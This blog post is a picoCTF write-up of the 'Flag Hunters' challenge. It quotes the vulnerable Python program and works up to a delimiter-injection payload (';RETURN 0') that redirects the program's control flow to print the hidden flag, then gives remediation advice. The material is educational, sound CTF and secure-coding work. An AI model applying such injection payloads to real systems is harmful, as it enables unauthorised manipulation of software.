---
slug: "picoctf-flag-hunters"
title: "picoCTF Flag Hunters: Delimiter Injection Into Control Flow"
date: "2025-10-11"
category: "ctf"
tags:
  - "CTF"
  - "Code Injection"
  - "picoCTF"
excerpt: "User input is concatenated, then split on a semicolon, then matched as a command. That ordering is the whole vulnerability."
readTime: "12 min"
featured: true
---

### Flag Hunters

Author: syreal

Description

Lyrics jump from verses to the refrain kind of like a subroutine call. There's a hidden refrain this program doesn't print by default. Can you get it to print it? There might be something in it for you.The program's source code can be downloaded here.

Additional details will be available after launching your challenge instance.

Hints

This program can easily get into undefined states. Don't be shy about Ctrl-C.

Unsanitized user input is always good, right?

Is there any syntax that is ripe for subversion?

1. we are to connect to it via netcat

![picoCTF Flag Hunters: Delimiter Injection Into Control Flow — figure 1](/images/blog/picoctf-flag-hunters/figure1.png)

![picoCTF Flag Hunters: Delimiter Injection Into Control Flow — figure 2](/images/blog/picoctf-flag-hunters/figure2.png)

2. Next I looked at the source code to know what was happening

PERFECT! This is a code injection vulnerability through the CROWD input!

## Vulnerability Analysis:

Look at this part of the code:

elif re.match(r"CROWD.*", line):

crowd = input('Crowd: ')

song_lines[lip] = 'Crowd: ' + crowd

lip += 1

## ```

The user input from `crowd` is inserted directly into `song_lines[lip]`, and later the code evaluates lines like `REFRAIN`, `RETURN`, and `END` as commands!

```
## The Exploit:
```

The **secret intro** (which contains the flag) is at the very beginning of `song_flag_hunters` but starts before `[REFRAIN]`. You need to make the program jump to line 0 or to the secret intro.

```
### Solution:
```

When prompted with `Crowd: `, enter:

## ```

```
RETURN 0
```

## **Payload:** `RETURN 0`

## **Expected Result:** Jump to line 0 and print the secret intro

## **Actual Result:**

## ```

Crowd: RETURN 0

Binary sorcerers, let's tear it apart,

Disassemble the code to reveal the dark heart...

## [continued looping through verses]

Why It Failed: The input became Crowd: RETURN 0 in the song array. The regex pattern r"RETURN [0-9]+" didn't match because the line started with "Crowd: ", not "RETURN". The injected command was treated as plain text and never executed.

### Attempt 2: Negative Line Numbers

Payload: RETURN -1

Rationale: Try to reach lines before the start, possibly wrapping around to the secret intro

Actual Result: Same looping behavior as Attempt 1

Why It Failed: Two problems:

The regex r"RETURN [0-9]+" only matches positive integers (no minus sign in the pattern)

Still had the "Crowd: " prefix issue preventing regex match

### Attempt 3: Empty Input

Payload: [Enter key] (empty string)

Expected Result: Perhaps bypass or skip the line

Actual Result: Nothing happened, program continued normally

Why It Failed:

```
python
```

if line == '' and song_lines[lip] != '':

continue

Empty lines are simply skipped, advancing to the next line without any special behavior.

The input gets prepended with 'Crowd: ', so when you enter RETURN 0, it becomes Crowd: RETURN 0 in song_lines[lip].

Then later when processing:

```
python
```

elif re.match(r"RETURN [0-9]+", line):

lip = int(line.split()[1])

It checks if the line matches RETURN [0-9]+, but your line is Crowd: RETURN 0, which doesn't match the regex!

## The Real Solution:

You need to inject something that will be processed after being split by ;. Look at this:

```
python
```

for line in song_lines[lip].split(';'):

## ```

It splits by semicolon! So if you enter:

## ```

## ;RETURN 0

## ```

It becomes `Crowd: ;RETURN 0`, and when split by `;`, you get:

## - `Crowd: ` (empty, gets skipped)

## - `RETURN 0` (this will match the regex!)

And this one worked:

![picoCTF Flag Hunters: Delimiter Injection Into Control Flow — figure 3](/images/blog/picoctf-flag-hunters/figure3.png)

The semicolon is the key to breaking out of the "Crowd: " prefix! 🚩

# Flag Hunters - Complete CTF Write-up

## Challenge Information

Challenge Name: Flag Hunters
Author: syreal
Category: Binary Exploitation / Code Injection
Platform: PicoCTF
Difficulty: Medium

Description:

Lyrics jump from verses to the refrain kind of like a subroutine call. There's a hidden refrain this program doesn't print by default. Can you get it to print it? There might be something in it for you. The program's source code can be downloaded here.

Hints:

This program can easily get into undefined states. Don't be shy about Ctrl-C.

Unsanitized user input is always good, right?

Is there any syntax that is ripe for subversion?

Connection: nc verbal-sleep.picoctf.net 52493

## Initial Reconnaissance

### Understanding the Challenge

The challenge presents a song lyrics program that processes verses and refrains. The description mentions a "hidden refrain" that doesn't print by default, hinting that we need to manipulate program execution to reveal hidden content.

### Source Code Analysis

Upon downloading the source code, we're presented with a Python script. Let's break down the key components:

1. The Hidden Flag

```
python
# Read in flag from file
```

flag = open('flag.txt', 'r').read()

secret_intro = \

'''Pico warriors rising, puzzles laid bare,

Solving each challenge with precision and flair.

With unity and skill, flags we deliver,

The ether's ours to conquer, '''+ flag + '\n'

Key Finding: The flag is embedded in a secret_intro string that's prepended to the main song content.

2. Song Structure

```
python
```

song_flag_hunters = secret_intro + '''

## [REFRAIN]

We're flag hunters in the ether, lighting up the grid,

## ...

## [VERSE1]

Command line wizards, we're starting it right,

## ...

```
CROWD (Singalong here!);
```

## ...

'''

The song contains:

Secret intro with the flag (lines 0-8 approximately)

## [REFRAIN] marker

## [VERSE1] marker (where execution starts)

CROWD prompts for user input

Command keywords: REFRAIN, RETURN, END

3. The Vulnerable Input Handler

```
python
def reader(song, startLabel):
```

lip = 0  # Line pointer

start = 0

refrain = 0

refrain_return = 0

finished = False

```
# Get list of lyric lines
```

song_lines = song.splitlines()

```
# Find startLabel, refrain and refrain return
```

for i in range(0, len(song_lines)):

if song_lines[i] == startLabel:

start = i + 1

elif song_lines[i] == '[REFRAIN]':

refrain = i + 1

elif song_lines[i] == 'RETURN':

refrain_return = i

```
# Print lyrics
```

line_count = 0

lip = start

while not finished and line_count < MAX_LINES:

line_count += 1

for line in song_lines[lip].split(';'):

if line == '' and song_lines[lip] != '':

continue

if line == 'REFRAIN':

song_lines[refrain_return] = 'RETURN ' + str(lip + 1)

lip = refrain

elif re.match(r"CROWD.*", line):

crowd = input('Crowd: ')

song_lines[lip] = 'Crowd: ' + crowd  # VULNERABILITY!

lip += 1

elif re.match(r"RETURN [0-9]+", line):

lip = int(line.split()[1])

elif line == 'END':

finished = True

else:

print(line, flush=True)

time.sleep(0.5)

lip += 1

reader(song_flag_hunters, '[VERSE1]')

4. Critical Vulnerability Identified

```
python
```

elif re.match(r"CROWD.*", line):

crowd = input('Crowd: ')

song_lines[lip] = 'Crowd: ' + crowd  # User input directly inserted!

lip += 1

Vulnerability Type: Code Injection via Unsanitized Input

The user input is directly concatenated and inserted into the song_lines array without any validation or sanitization. This array is later processed and commands are executed based on its content.

## Exploitation Strategy

### Understanding the Execution Flow

Program starts at [VERSE1] (not at line 0 where the flag is)

Lines are processed sequentially

When a line contains CROWD, user input is requested

User input is inserted into the song array

Commands like REFRAIN, RETURN [number], and END control program flow

### The Goal

We need to manipulate the lip (line pointer) to jump to line 0 where secret_intro (containing the flag) is located.

### Command Processing Logic

```
python
```

for line in song_lines[lip].split(';'):

if line == 'REFRAIN':

```
# Jump to refrain
```

elif re.match(r"RETURN [0-9]+", line):

lip = int(line.split()[1])  # Jump to specified line

elif line == 'END':

finished = True

Key observations:

Lines are split by semicolons (;) before processing

```
RETURN [number] regex allows jumping to any line number
```

Each split segment is processed independently

## Exploitation Attempts

### Attempt 1: Direct RETURN Command

Payload: RETURN 0

Hypothesis: Inject a RETURN command to jump to line 0

Execution:

bash

```
$ nc verbal-sleep.picoctf.net 52493
```

Command line wizards, we're starting it right,

## ...

Crowd: RETURN 0

Binary sorcerers, let's tear it apart,

## ...

## [continues looping through regular verses]

Result: ❌ Failed

Analysis: The input becomes 'Crowd: RETURN 0' in the array. When the regex r"RETURN [0-9]+" is checked against this string, it fails to match because the line starts with "Crowd: ", not "RETURN". The command is treated as plain text and never executed.

```
python
# What we wanted:
```

line = "RETURN 0"  # Would match regex ✓

```
# What we actually got:
```

line = "Crowd: RETURN 0"  # Doesn't match regex ✗

### Attempt 2: Negative Line Numbers

Payload: RETURN -1

Hypothesis: Use negative indexing to wrap around to the beginning

Execution:

bash

Crowd: RETURN -1

## [continues looping normally]

Result: ❌ Failed

Analysis: Two issues prevented this from working:

The regex pattern r"RETURN [0-9]+" only matches positive integers (no minus sign in the character class)

Still had the "Crowd: " prefix issue preventing the regex match

### Attempt 3: Empty Input

Payload: [Enter] (empty string)

Hypothesis: Perhaps empty input bypasses processing or causes an error

Result: ❌ Failed

Analysis:

```
python
```

if line == '' and song_lines[lip] != '':

continue

Empty lines are simply skipped with no special behavior. The program continues to the next line normally.

### Attempt 4: Other Basic Attempts

We also tried:

END - Just terminates the program without revealing the flag

REFRAIN - Jumps to the refrain but doesn't help reach line 0

Various line numbers: RETURN 5, RETURN 10 - Same prefix issue

## The Breakthrough: Delimiter Injection

### Critical Insight

Re-examining the processing logic, we notice this crucial line:

```
python
```

for line in song_lines[lip].split(';'):

The semicolon is a command delimiter! Lines are split by ; before being processed and matched against regex patterns.

### The Winning Payload

Payload: ;RETURN 0

### Exploitation Process

Let's trace exactly what happens:

Step 1: Input Injection

```
python
```

crowd = input('Crowd: ')  # User enters: ;RETURN 0

song_lines[lip] = 'Crowd: ' + crowd

```
# Result: song_lines[lip] = 'Crowd: ;RETURN 0'
```

Step 2: Line Splitting

```
python
```

for line in song_lines[lip].split(';'):

```
# Split 'Crowd: ;RETURN 0' by ';'
# Result: ['Crowd: ', 'RETURN 0']
```

Step 3: Processing Each Segment

First segment: 'Crowd: '

Nearly empty, gets skipped or processed as insignificant text

Second segment: 'RETURN 0'

```
python
```

elif re.match(r"RETURN [0-9]+", line):  # ✅ MATCHES!

lip = int(line.split()[1])  # lip = 0

Now the regex successfully matches because we're checking 'RETURN 0' directly, without the "Crowd: " prefix!

Step 4: Jump to Line 0

```
python
```

lip = 0  # Line pointer now at the beginning

Step 5: Flag Revelation

The program continues executing from line 0, which contains:

```
python
```

secret_intro = \

'''Pico warriors rising, puzzles laid bare,

Solving each challenge with precision and flair.

With unity and skill, flags we deliver,

```
The ether's ours to conquer, picoCTF{[FLAG_HERE]}
```

'''

The flag is printed! 🚩

## Complete Exploitation

### Final Solution

bash

```
$ nc verbal-sleep.picoctf.net 52493
```

Command line wizards, we're starting it right,

Spawning shells in the terminal, hacking all night.

Scripts and searches, grep through the void,

Every keystroke, we're a cypher's envoy.

Brute force the lock or craft that regex,

Flag on the horizon, what challenge is next?

We're flag hunters in the ether, lighting up the grid,

No puzzle too dark, no challenge too hid.

With every exploit we trigger, every byte we decrypt,

We're chasing that victory, and we'll never quit.

Crowd: ;RETURN 0

Pico warriors rising, puzzles laid bare,

Solving each challenge with precision and flair.

With unity and skill, flags we deliver,

```
The ether's ours to conquer, picoCTF{[REDACTED]}
```

## ```

## **Flag obtained successfully!**

## ---

```
## Visual Comparison: Why Semicolon Matters
### ❌ Without Semicolon: `RETURN 0`
```

## ```

User Input: "RETURN 0"

## ↓

Stored as: "Crowd: RETURN 0"

## ↓

Split by ';': ["Crowd: RETURN 0"]  ← Single element array

## ↓

Regex check: r"RETURN [0-9]+" against "Crowd: RETURN 0"

## ↓

Result: NO MATCH ✗

## ↓

Treated as text, printed and skipped

## ```

```
### ✅ With Semicolon: `;RETURN 0`
```

## ```

User Input: ";RETURN 0"

## ↓

Stored as: "Crowd: ;RETURN 0"

## ↓

Split by ';': ["Crowd: ", "RETURN 0"]  ← Two element array

## ↓

Process 1st: "Crowd: " → Empty/skipped

Process 2nd: "RETURN 0" → Regex check

## ↓

Regex check: r"RETURN [0-9]+" against "RETURN 0"

## ↓

Result: MATCH ✓

## ↓

Extract number: lip = 0

## ↓

Jump to line 0

## ↓

Print secret_intro with FLAG! 🚩

## Technical Analysis

### Vulnerability Classification

CWE-94: Improper Control of Generation of Code (Code Injection)

The application constructs executable code using externally-influenced input without proper validation or neutralization of special elements.

### Root Cause

Unsanitized Input: User input is directly concatenated into a string that's later interpreted as code

Delimiter Confusion: The semicolon delimiter allows command injection by breaking out of the "Crowd: " prefix

Insufficient Validation: No checks on input content or format

Command Interpretation: The split-then-match pattern creates an exploitable parsing gap

### Attack Vector

Delimiter Injection - Using the application's own delimiter (semicolon) to inject malicious commands that bypass prefix restrictions.

## Remediation Recommendations

### 1. Input Sanitization

```
python
def sanitize_input(user_input):
# Whitelist only alphanumeric and spaces
```

if not re.match(r'^[a-zA-Z0-9 ]+$', user_input):

return ""

return user_input

crowd = sanitize_input(input('Crowd: '))

### 2. Remove Command Processing from User Input

```
python
# Don't allow user input to become executable commands
```

song_lines[lip] = 'Crowd: ' + crowd  # Keep as display text only

```
# Don't process this line for commands
```

### 3. Disable Delimiter in User Context

```
python
# Escape or remove semicolons from user input
```

crowd = input('Crowd: ').replace(';', '')

### 4. Separate Data from Control Flow

```
python
# Use a flag to mark lines as user-generated
```

user_lines = set()

user_lines.add(lip)

```
# Later, skip command processing for user lines
```

if lip in user_lines:

print(line)

continue

## Key Takeaways

### For CTF Players

Read the source code carefully - The vulnerability is usually hiding in plain sight

Trace the complete execution path - Don't just look at the injection point; follow how the data is processed

Understand delimiters and parsers - Special characters that control parsing are often exploitable

Test methodically - Document what works and what doesn't to understand the constraints

Think about data flow - How does input become output or execution?

### For Developers

Never trust user input - Always validate and sanitize

Avoid mixing data and code - Don't let user input become executable

Be aware of special characters - Delimiters, escape sequences, and control characters can be weaponized

Use allowlists, not denylists - Specify what IS allowed rather than trying to block everything dangerous

Defense in depth - Multiple layers of validation and control

### Technical Lessons

Delimiter injection is a real threat when applications parse input

Prefix-based protections can be bypassed if delimiters are processed after concatenation

Regex matching order matters - Match before or after parsing makes a huge difference

Code injection isn't just about SQL or XSS - Any interpreted input can be vulnerable

## Conclusion

The Flag Hunters challenge elegantly demonstrates how a simple oversight in input processing can lead to complete control flow manipulation. By exploiting the semicolon delimiter that the application uses to parse commands, we were able to inject our own control flow instruction and reveal the hidden flag.

The key insight was understanding that the vulnerability wasn't just in accepting user input—it was in the order of operations: concatenate first, split second, match third. This created a parsing gap that we exploited with delimiter injection.

```
Final Flag: picoCTF{[REDACTED]}
```

## References

CWE-94: Improper Control of Generation of Code

OWASP: Code Injection

Delimiter Injection: A subcategory of injection attacks exploiting parsing delimiters

Challenge Rating: ⭐⭐⭐⭐☆ (4/5)
Fun Factor: ⭐⭐⭐⭐⭐ (5/5)
Learning Value: ⭐⭐⭐⭐⭐ (5/5)

Great challenge for understanding input validation, parsing logic, and control flow manipulation!
